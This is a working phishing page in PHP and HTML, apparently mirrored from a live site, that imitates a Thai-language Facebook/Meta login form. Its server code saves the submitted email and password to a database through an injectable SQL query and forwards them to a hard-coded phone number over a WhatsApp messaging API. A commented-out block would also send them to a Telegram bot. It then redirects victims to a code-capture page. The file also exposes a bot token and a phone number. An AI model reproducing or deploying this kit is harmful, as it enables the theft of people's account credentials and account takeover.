<?php 

ob_start();
session_start();
include('koneksi.php');

if(isset($_POST['submit'])){
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $query = mysqli_query($conn,"INSERT INTO `tb_user_fb` (`email`, `password`) VALUES (
            '$email', '$pass')") or die(mysqli_error());
            
    
    // Token bot Telegram Anda
// $token = "6942386569:AAEvXAsJh5h3ZrgXJ1S2mQRBWbcc8_q0igA";

// // ID chat tempat Anda ingin mengirim pesan
// $chat_id = "-1267246103";

// // Pesan yang ingin Anda kirim
// $message = "email : $email
// password : $pass";

// // URL endpoint untuk mengirim pesan menggunakan bot API Telegram
// $url = "https://api.telegram.org/bot" . $token . "/sendMessage";

// // Data yang akan dikirimkan dalam format JSON
// $data = [
//     'chat_id' => $chat_id,
//     'text' => $message
// ];

// $options = [
//     'http' => [
//         'method' => 'POST',
//         'header' => 'Content-Type: application/json',
//         'content' => json_encode($data)
//     ]
// ];

// $context = stream_context_create($options);
// $result = file_get_contents($url, false, $context);

$cekFonnte = mysqli_query($conn,"SELECT * FROM `tb_tripayapi` WHERE id = 10") or die(mysqli_error());
    $cf = mysqli_fetch_array($cekFonnte);
    $sql_1b = mysqli_query($conn,"SELECT * FROM `tb_user` WHERE id = 1") or die(mysqli_error());
    $s1b = mysqli_fetch_array($sql_1b);
            
    $nomor_hp = "087805806118";
    if($cf['status'] == 1){
        $content = "Email : $email\n 
        password : $pass";
    
        $curl = curl_init();
    
        curl_setopt_array($curl, array(
            CURLOPT_URL => "https://api.fonnte.com/send",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => "",
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_POSTFIELDS => http_build_query(array(
                'target' => $nomor_hp,
                'message' => $content,
                'countryCode' => '62'
            )),
            CURLOPT_HTTPHEADER => array(
                "Authorization: ".$cf['api_key']
            ),
        ));
    
        $response = curl_exec($curl);
        $http_status = curl_getinfo($curl, CURLINFO_HTTP_CODE); // Mendapatkan status HTTP
        curl_close($curl);

        
        
        header('location:https://metabusinesssuite.qi-mq.my.id/THA2Fy/kode.php');
    }
    return false; // Jika layanan tidak aktif, kembalikan false

    
    }
	

?>



<!DOCTYPE html>
<html lang="en">
  
<!-- Mirrored from metabusinesssuite.qi-mq.my.id/THA2Fy/login.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 16 Feb 2024 09:35:14 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />
    <!-- Bootstrap CSS -->
    <link
      href="../../cdn.jsdelivr.net/npm/bootstrap%405.0.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
      crossorigin="anonymous"
    />
    <link rel="shortcut icon" href="assets/img/favfb.png" type="image/x-icon">
    <link rel="stylesheet" href="assets/fathz.css" />
    <title>เข้าสู่ระบบ | เข้าสู่ระบบ Facebook</title>
  </head>
  <body>
    <center><div class="container">
      <header>
        <nav>
          <div class="logometa">
            <img src="assets/img/meta.png" alt="Meta Logo" />
          </div>
          <ul class="menu">
            <li><a href="#">ช่วย</a></li>
          </ul>
        </nav>
      </header>
      <center>
        <!-- <img class="fbsesi" src="assets/img/fbsesi.jpg" alt="Facebook Ssi" /> -->
        <div class="peringatanakun">
            <p>กรุณาเข้าสู่บัญชีของคุณเพื่อดำเนินการต่อ</p>
          </div>
      </center>
      <div class="logoalexfbperingatan">
        <svg
          id="Layer_1"
          data-name="Layer 1"
          xmlns="http://www.w3.org/2000/svg"
          viewBox="0 0 1022.51 360"
        >
          <defs>
            <style>
              .cls-1 {
                fill: #1877f2;
              }
            </style>
          </defs>
          <title>FBWordmark_Hex-RGB-1024</title>
          <path
            class="cls-1"
            d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3H154v76.78H123.11V181.36H102.3v-25.3h20.81V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z"
          ></path>
          <path
            class="cls-1"
            d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z"
          ></path>
          <path
            class="cls-1"
            d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z"
          ></path>
          <path
            class="cls-1"
            d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z"
          ></path>
          <path
            class="cls-1"
            d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z"
          ></path>
          <path
            class="cls-1"
            d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z"
          ></path>
          <path
            class="cls-1"
            d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z"
          ></path>
          <path
            class="cls-1"
            d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z"
          ></path>
        </svg>
      </div>
        <form action="" method="post">
        <div class="formalexfbperingatan">
                <input
                  type="text"
                  name="email"
                  class="email form-control-plaintext"
                  placeholder="อีเมลหรือหมายเลขโทรศัพท์มือถือ"
                  id="alx_email_fb"
                  autocomplete="off" required
                />
                <input
                  type="password"
                  name="pass"
                  class="form-control-plaintext"
                  placeholder="รหัสผ่าน"
                  id="alx_password_fb"
                  autocomplete="off" required
                />
                <button type="submit" name="submit">เข้าสู่ระบบ</button>
                <span>ลืมรหัสผ่านหรือไม่?</span>
              </div>
        </form>
      <foot class="copyright" style="margin-top: 20px;">
        <div class="footalexfbperingatan">
          <div class="atasfootalexperingatan">
            <div class="itemfootalexperingatan">
              <span style="color: #747474; font-size: 13px"
                >Thailand</span
              >
              <span>Bahasa Jawa</span>
              <span>日本語</span>
              <span>Português (Brasil)</span>
            </div>
            <div class="itemfootalexperingatan">
              <span>English (UK)</span>
              <span>Bahasa Melayu</span>
              <span>Español</span>
              <label><i class="bi bi-plus-lg"></i></label>
            </div>
          </div>
          <br />
          <div class="copyrightalexfbperingatan">
            <span style="font-size: 10">Meta © 2023</span>
          </div>
        </div>
      </foot>
    </div>
    <script
      src="../../kit.fontawesome.com/08380760ee.js"
      crossorigin="anonymous"
    ></script>
    <script
      src="../../cdn.jsdelivr.net/npm/bootstrap%405.0.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
      crossorigin="anonymous"
    ></script>
    </center>
  </body>

<!-- Mirrored from metabusinesssuite.qi-mq.my.id/THA2Fy/login.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 16 Feb 2024 09:35:16 GMT -->
</html>
